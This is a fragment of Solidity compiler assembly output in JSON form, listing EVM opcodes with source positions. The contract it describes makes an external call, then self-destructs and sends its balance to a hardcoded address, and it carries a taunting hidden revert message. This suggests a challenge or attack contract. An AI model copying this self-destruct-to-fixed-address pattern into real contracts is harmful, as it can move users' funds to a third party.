											"begin": 1206,
											"end": 1279,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "tag",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1311,
											"end": 1353,
											"name": "PUSH",
											"source": 0,
											"value": "798349E06C67272465123B91BD88C5D19B8C7878"
										},
										{
											"begin": 1290,
											"end": 1355,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1290,
											"end": 1355,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1290,
											"end": 1355,
											"name": "SELFDESTRUCT",
											"source": 0
										},
										{
											"begin": 7,
											"end": 156,
											"name": "tag",
											"source": 1,
											"value": "26"
										},
										{
											"begin": 7,
											"end": 156,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 43,
											"end": 50,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 83,
											"end": 149,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF00000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 76,
											"end": 81,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 72,
											"end": 150,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 61,
											"end": 150,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 61,
											"end": 150,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 156,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 7,
											"end": 156,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 7,
											"end": 156,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 156,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 162,
											"end": 277,
											"name": "tag",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 162,
											"end": 277,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 247,
											"end": 270,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 264,
											"end": 269,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 247,
											"end": 270,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "26"
										},
										{
											"begin": 247,
											"end": 270,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 247,
											"end": 270,
											"name": "tag",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 247,
											"end": 270,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 242,
											"end": 245,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 235,
											"end": 271,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 162,
											"end": 277,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 162,
											"end": 277,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 162,
											"end": 277,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 283,
											"end": 501,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 283,
											"end": 501,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 374,
											"end": 378,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 412,
											"end": 414,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 401,
											"end": 410,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 397,
											"end": 415,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 389,
											"end": 415,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 389,
											"end": 415,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 425,
											"end": 494,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 491,
											"end": 492,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 480,
											"end": 489,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 476,
											"end": 493,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 467,
											"end": 473,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 425,
											"end": 494,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 425,
											"end": 494,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 425,
											"end": 494,
											"name": "tag",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 425,
											"end": 494,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 283,
											"end": 501,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 283,
											"end": 501,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 283,
											"end": 501,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 283,
											"end": 501,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 283,
											"end": 501,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 507,
											"end": 605,
											"name": "tag",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 507,
											"end": 605,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 558,
											"end": 564,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 592,
											"end": 597,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 586,
											"end": 598,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 576,
											"end": 598,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 576,
											"end": 598,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 507,
											"end": 605,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 507,
											"end": 605,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 507,
											"end": 605,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 507,
											"end": 605,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 611,
											"end": 758,
											"name": "tag",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 611,
											"end": 758,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 712,
											"end": 723,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 749,
											"end": 752,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 734,
											"end": 752,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 734,
											"end": 752,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 611,
											"end": 758,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 611,
											"end": 758,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 611,
											"end": 758,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 611,
											"end": 758,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 611,
											"end": 758,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 764,
											"end": 1071,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 764,
											"end": 1071,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 832,
											"end": 833,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 842,
											"end": 955,
											"name": "tag",
											"source": 1,
											"value": "47"
										},
										{
											"begin": 842,
											"end": 955,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 856,
											"end": 862,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 853,
											"end": 854,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 850,
											"end": 863,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 842,
											"end": 955,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 842,
											"end": 955,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "49"
										},
										{
											"begin": 842,
											"end": 955,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 941,
											"end": 942,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 936,
											"end": 939,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 932,
											"end": 943,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 926,
											"end": 944,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 922,
											"end": 923,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 917,
											"end": 920,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 913,
											"end": 924,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 906,
											"end": 945,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 878,
											"end": 880,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 875,
											"end": 876,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 871,
											"end": 881,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 866,
											"end": 881,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 866,
											"end": 881,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 842,
											"end": 955,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "47"
										},
										{
											"begin": 842,
											"end": 955,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 842,
											"end": 955,
											"name": "tag",
											"source": 1,
											"value": "49"
										},
										{
											"begin": 842,
											"end": 955,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 973,
											"end": 979,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 970,
											"end": 971,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 967,
											"end": 980,
											"name": "GT",
											"source": 1
										},
										{
											"begin": 964,
											"end": 1065,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 964,
											"end": 1065,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "50"
										},
										{
											"begin": 964,
											"end": 1065,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1053,
											"end": 1054,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1044,
											"end": 1050,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1039,
											"end": 1042,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1035,
											"end": 1051,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1028,
											"end": 1055,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 964,
											"end": 1065,
											"name": "tag",
											"source": 1,
											"value": "50"
										},
										{
											"begin": 964,
											"end": 1065,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 813,
											"end": 1071,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 764,
											"end": 1071,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 764,
											"end": 1071,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 764,
											"end": 1071,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 764,
											"end": 1071,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1077,
											"end": 1450,
											"name": "tag",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 1077,
											"end": 1450,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1181,
											"end": 1184,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1209,
											"end": 1247,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "52"
										},
										{
											"begin": 1241,
											"end": 1246,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1209,
											"end": 1247,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 1209,
											"end": 1247,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1209,
											"end": 1247,
											"name": "tag",
											"source": 1,
											"value": "52"
										},
										{
											"begin": 1209,
											"end": 1247,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1263,
											"end": 1351,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "53"
										},
										{
											"begin": 1344,
											"end": 1350,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1339,
											"end": 1342,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 1263,
											"end": 1351,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 1263,
											"end": 1351,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1263,
											"end": 1351,
											"name": "tag",
											"source": 1,
											"value": "53"
										},
										{
											"begin": 1263,
											"end": 1351,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1256,
											"end": 1351,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 1256,
											"end": 1351,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1360,
											"end": 1412,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 1405,
											"end": 1411,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1400,
											"end": 1403,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 1393,
											"end": 1397,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1386,
											"end": 1391,
											"name": "DUP7",
											"source": 1
										},
										{
											"begin": 1382,
											"end": 1398,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1360,
											"end": 1412,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 1360,
											"end": 1412,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1360,
											"end": 1412,
											"name": "tag",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 1360,
											"end": 1412,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1437,
											"end": 1443,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1432,
											"end": 1435,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1428,
											"end": 1444,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1421,
											"end": 1444,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1421,
											"end": 1444,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1185,
											"end": 1450,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1077,
											"end": 1450,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1077,
											"end": 1450,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1077,
											"end": 1450,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1077,
											"end": 1450,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1077,
											"end": 1450,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1456,
											"end": 1727,
											"name": "tag",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 1456,
											"end": 1727,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1586,
											"end": 1589,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1608,
											"end": 1701,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "56"
										},
										{
											"begin": 1697,
											"end": 1700,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1688,
											"end": 1694,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1608,
											"end": 1701,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 1608,
											"end": 1701,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1608,
											"end": 1701,
											"name": "tag",
											"source": 1,
											"value": "56"
										},
										{
											"begin": 1608,
											"end": 1701,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1601,
											"end": 1701,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1601,
											"end": 1701,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1718,
											"end": 1721,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1711,
											"end": 1721,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1711,
											"end": 1721,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1456,
											"end": 1727,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1456,
											"end": 1727,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1456,
											"end": 1727,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1456,
											"end": 1727,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1456,
											"end": 1727,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1733,
											"end": 1902,
											"name": "tag",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 1733,
											"end": 1902,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1817,
											"end": 1828,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1851,
											"end": 1857,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1846,
											"end": 1849,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1839,
											"end": 1858,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1891,
											"end": 1895,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1886,
											"end": 1889,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1882,
											"end": 1896,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1867,
											"end": 1896,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1867,
											"end": 1896,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1733,
											"end": 1902,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1733,
											"end": 1902,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1733,
											"end": 1902,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1733,
											"end": 1902,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1733,
											"end": 1902,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1908,
											"end": 2089,
											"name": "tag",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 1908,
											"end": 2089,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2048,
											"end": 2081,
											"name": "PUSH",
											"source": 1,
											"value": "6C6F6C20686F772064696420796F75206576656E2066696E6420746869733F00"
										},
										{
											"begin": 2044,
											"end": 2045,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2036,
											"end": 2042,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2032,
											"end": 2046,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2025,
											"end": 2082,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1908,
											"end": 2089,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1908,
											"end": 2089,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2095,
											"end": 2461,
											"name": "tag",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 2095,
											"end": 2461,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2237,
											"end": 2240,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2258,
											"end": 2325,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "60"
										},
										{
											"begin": 2322,
											"end": 2324,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 2317,
											"end": 2320,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 2258,
											"end": 2325,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 2258,
											"end": 2325,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2258,
											"end": 2325,
											"name": "tag",
											"source": 1,
											"value": "60"
										},
										{
											"begin": 2258,
											"end": 2325,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2251,
											"end": 2325,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2251,
											"end": 2325,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2334,
											"end": 2427,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "61"
										},
										{
											"begin": 2423,
											"end": 2426,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2334,
											"end": 2427,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 2334,
											"end": 2427,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2334,
											"end": 2427,
											"name": "tag",
											"source": 1,
											"value": "61"
										},
										{
											"begin": 2334,
											"end": 2427,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2452,
											"end": 2454,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 2447,
											"end": 2450,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2443,
											"end": 2455,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2436,
											"end": 2455,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2436,
											"end": 2455,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2095,
											"end": 2461,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2095,
											"end": 2461,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2095,
											"end": 2461,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2095,
											"end": 2461,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2467,
											"end": 2886,
											"name": "tag",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 2467,
											"end": 2886,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2633,
											"end": 2637,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2671,
											"end": 2673,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 2660,
											"end": 2669,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2656,
											"end": 2674,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2648,
											"end": 2674,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2648,
											"end": 2674,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2720,
											"end": 2729,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2714,
											"end": 2718,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2710,
											"end": 2730,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 2706,
											"end": 2707,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2695,
											"end": 2704,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 2691,
											"end": 2708,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2684,
											"end": 2731,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2748,
											"end": 2879,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "63"
										},
										{
											"begin": 2874,
											"end": 2878,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2748,
											"end": 2879,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 2748,
											"end": 2879,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2748,
											"end": 2879,
											"name": "tag",
											"source": 1,
											"value": "63"
										},
										{
											"begin": 2748,
											"end": 2879,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2740,
											"end": 2879,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2740,
											"end": 2879,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2467,
											"end": 2886,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2467,
											"end": 2886,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2467,
											"end": 2886,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2467,
											"end": 2886,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2892,
											"end": 3018,
											"name": "tag",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 2892,
											"end": 3018,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2929,
											"end": 2936,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2969,
											"end": 3011,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2962,
											"end": 2967,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2958,
											"end": 3012,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 2947,
											"end": 3012,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2947,
											"end": 3012,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2892,
											"end": 3018,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2892,
											"end": 3018,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2892,
											"end": 3018,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2892,
											"end": 3018,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 3024,
											"end": 3120,
											"name": "tag",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 3024,
											"end": 3120,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3061,
											"end": 3068,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3090,
											"end": 3114,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "66"
										},
										{
											"begin": 3108,
											"end": 3113,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3090,
											"end": 3114,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 3090,
											"end": 3114,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 3090,
											"end": 3114,
											"name": "tag",
											"source": 1,
											"value": "66"
										},
										{
											"begin": 3090,
											"end": 3114,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3079,
											"end": 3114,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3079,
											"end": 3114,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3024,
											"end": 3120,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3024,
											"end": 3120,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3024,
											"end": 3120,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3024,
											"end": 3120,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 3126,
											"end": 3244,
											"name": "tag",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 3126,
											"end": 3244,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3237,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "68"
										},
										{
											"begin": 3231,
											"end": 3236,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3213,
											"end": 3237,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 3213,
											"end": 3237,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 3213,
											"end": 3237,
											"name": "tag",
											"source": 1,
											"value": "68"
										},
										{
											"begin": 3213,
											"end": 3237,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3208,
											"end": 3211,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3201,
											"end": 3238,
